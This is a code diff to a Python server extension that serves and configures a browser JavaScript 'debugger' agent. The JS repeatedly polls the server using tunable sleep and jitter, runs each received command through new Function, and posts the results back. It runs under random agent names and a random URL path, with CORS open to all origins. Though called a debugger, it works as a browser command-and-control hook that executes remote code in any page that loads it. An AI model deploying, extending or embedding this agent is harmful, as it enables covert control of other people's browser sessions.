@@ -16,8 +16,9 @@ Usage:
 
 CLI flags:
     --debugger-path PATH        URL path for the JS payload (use {RANDOM} for random segment, default: /debugger/{RANDOM})
-    --debugger-id-length N      Length of the random path segment (default: 8)
+    --debugger-id-length N      Length of the random path segment (default: 6)
     --debugger-no-input         Disable the TUI input thread (for testing)
+    --debugger-minify-js                 Minify the JS payload with rjsmin (optional)
 """
 
 from dataclasses import dataclass, field
@@ -50,35 +51,82 @@ CORS = {"Access-Control-Allow-Origin": "*"}
 # ────────────────────────────────────────────────
 
 BROWSER_JS = """(function(){
-var b='{DEBUGGER_BASE}';
-var i=-1,p=0,pct=10,sleepy=5;
-function generateId(length = 6) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  let id = '';
-  for (let i = 0; i < length; i++) {
-    id += chars.charAt(Math.floor(Math.random() * chars.length));
+  var base = '{DEBUGGER_BASE}';
+  var lastId = -1;
+  var polling = 0;
+  var sleepy = 5;
+  var jitter = 10;
+
+  function generateId(length) {
+    length = length || 6;
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var id = '';
+    for (var i = 0; i < length; i++) {
+      id += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return id;
   }
-  return id;
-}
-var nm = generateId();
 
-function n(){
-setTimeout(function(){if(!p)r()},sleepy*1000 + sleepy*1000*(Math.random()*2*pct - pct)/100)}
-function r(){p=1;fetch(b+'{DEBUGGER_PATH}/pending?name='+nm+'&last_id='+i,{credentials:'omit'}).then(function(x){if(!x.ok)throw Error(x.status);return x.json()}).then(function(c){
-c.forEach(function(m){
-console.log('cmd:', m.code);
-if (m.code.toLowerCase().startsWith('sleep ')) {
- const [_, sl, thr] = m.code.split(' ');
- console.log('sleep:', 'sl=', sl, 'thr=', thr)
- if (sl && Number(sl)) sleepy = Number(sl);
- if (thr && Number(thr)) throttle_pct = Number(thr);
- return;
-}
-var a,d;try{var f=new Function('return '+m.code);a=f();a=a===void 0?'undefined':String(a)}catch(e){d=String(e)}
-var g={id:m.id,name:nm};d?g.error=d:g.result=a;fetch(b+'{DEBUGGER_PATH}/result',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(g),credentials:'omit'}).catch(function(){});i=m.id});p=0;n()}).catch(function(){p=0;n()})}
-r()})();"""
+  var nm = generateId();
 
-# TODO: jitter doesn't seem to work, fix later
+  function schedule() {
+    var baseDelay = sleepy * 1000;
+    var range = baseDelay * jitter / 100;
+    var delay = baseDelay + (Math.random() * 2 - 1) * range;
+    setTimeout(function() {
+      if (!polling) poll();
+    }, delay);
+  }
+
+  function poll() {
+    polling = 1;
+    fetch(base + '{DEBUGGER_PATH}/pending?name=' + nm + '&last_id=' + lastId, {credentials: 'omit'})
+      .then(function(res) {
+        if (!res.ok) throw Error(res.status);
+        return res.json();
+      })
+      .then(function(cmds) {
+        cmds.forEach(function(m) {
+          if (m.code.toLowerCase().startsWith('sleep ')) {
+            var parts = m.code.split(' ');
+            if (parts[1] && Number(parts[1])) sleepy = Number(parts[1]);
+            if (parts[2] && Number(parts[2])) jitter = Number(parts[2]);
+            return;
+          }
+          var result, error;
+          try {
+            var fn = new Function('return ' + m.code);
+            result = fn();
+            result = result === void 0 ? 'undefined' : String(result);
+          } catch (e) {
+            error = String(e);
+          }
+          var payload = {id: m.id, name: nm};
+          if (error) {
+            payload.error = error;
+          } else {
+            payload.result = result;
+          }
+          fetch(base + '{DEBUGGER_PATH}/result', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload),
+            credentials: 'omit',
+          }).catch(function() {});
+          lastId = m.id;
+        });
+        polling = 0;
+        schedule();
+      })
+      .catch(function() {
+        polling = 0;
+        schedule();
+      });
+  }
+
+  poll();
+})();"""
+
 
 # ────────────────────────────────────────────────
 #   Mixin — CLI flags, shared state, input thread
@@ -95,7 +143,7 @@ class DebuggerMixin:
     debugger_path: str = _field("/debugger/{RANDOM}", group=GROUP, flags=["--debugger-path"], doc="URL path for the interactive debugger JS payload. Use {RANDOM} to insert a random ID in the path")
     debugger_no_input: bool = _field(False, group=GROUP, flags=["--debugger-no-input"], doc="Disable the TUI input thread (for testing)")
     debugger_random_id_length: int = _field(6, group=GROUP, flags=["--debugger-id-length"], doc="The length of the random ID. Consider using the --block-scanners flag to mitigate against brute-forcing. Set to 0 to replace {RANDOM} with nothing")
-    debugger_base: str = _field(None, group=GROUP, required=True, doc="Origin for the base URL for callback, e.g. https://your-server.com")
+    minify_js: bool = _field(False, group=GROUP, flags=["--debugger-minify-js"], doc="Minify the debugger JS payload using rjsmin")
 
     def __post_init__(self):
         self._pending = []
@@ -112,7 +160,6 @@ class DebuggerMixin:
             self.debugger_path = self.debugger_path.replace("{RANDOM}", instance_id)
         else:
             self.debugger_path = self.debugger_path.replace("/{RANDOM}", "")
-        self._browser_js = self._browser_js.replace("{DEBUGGER_BASE}", self.debugger_base)
         self._browser_js = self._browser_js.replace("{DEBUGGER_PATH}", self.debugger_path)
 
         if not HAS_RICH:
@@ -126,9 +173,29 @@ class DebuggerMixin:
 
         super().__post_init__()
 
+        proto = 'https' if self.server.supports_https else 'http'
+        hostname = self.server.hostname or ""
+        self.server.instance.require_hostname("The debugger extension's browser agent uses the hostname to point to the server.\nAbsence of a hostname may lead the agent failing to connect, particularly in no-origin browser-like contexts.", failFast=False)
+        # If no hostname is provided, we use the empty string, which means paths in the browser will be treated as absolute paths.
+        # For instance, fetch('/abc') makes a request to the /abc path at the browser's origin. This works for most browsers.
+        # However, some contexts do NOT have an origin, such as isolated webviews on mobile.
+        self._browser_js = self._browser_js.replace("{DEBUGGER_BASE}", f"{proto}://{hostname}:{self.port}")
+
+        if self.minify_js:
+            try:
+                import rjsmin
+                self._browser_js = rjsmin.jsmin(self._browser_js)
+            except ImportError:
+                self.warning(f"rjsmin not available — skipping JS minification:")
+                self.warning(f"")
+                self.warning(f"\tpip install rjsmin")
+
+        self.server._browser_js = self._browser_js
+
         if not self.debugger_no_input:
             self._start_input_thread()
-        self.printstatus(f"Debugger: http://127.0.0.1:{self.port}{self.debugger_path}")
+        
+        self.printstatus(f"Debugger: {proto}://{hostname or '127.0.0.1'}:{self.port}{self.debugger_path}")
 
     def _print_result(self, r):
         name = r.get("name", "???")
@@ -199,7 +266,6 @@ class DebuggerProcessor:
     def do_GET(self, req):
         path = urlsplit(req.path).path.rstrip("/")
         base = self._base(req)
-        # print(path)
 
         if path == base:
             req.send_response_full(200, content=req.server._browser_js, mime="text/javascript", headers=CORS)
